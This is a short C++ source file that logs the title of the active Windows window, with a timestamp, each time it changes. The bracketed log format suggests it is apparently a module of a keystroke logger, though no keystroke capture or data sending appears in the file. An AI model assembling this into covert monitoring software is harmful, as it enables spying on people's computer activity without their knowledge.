#include "../../include/windows_info.h"
#include <iostream>

WindowInfo::WindowInfo() {}

void WindowInfo::GetActiveWindowInfo(std::stringstream& output) {
    HWND foreground = GetForegroundWindow();

    if (foreground)
    {
        char window_title[256];
        GetWindowTextA(foreground, (LPSTR)window_title, 256);

        if (strcmp(window_title, this->lastwindow) != 0)
        {
            strcpy_s(lastwindow, sizeof(lastwindow), window_title);
            appendWindowTitle(output, window_title);
        }
    }
}

void WindowInfo::appendWindowTitle(std::stringstream& output, const char* window_title) {
    time_t t = time(NULL);
    struct tm tm;
    localtime_s(&tm, &t);
    char s[64];
    strftime(s, sizeof(s), "%c", &tm);

    output << "\n\n[Window: " << window_title << " - at " << s << "] ";
}
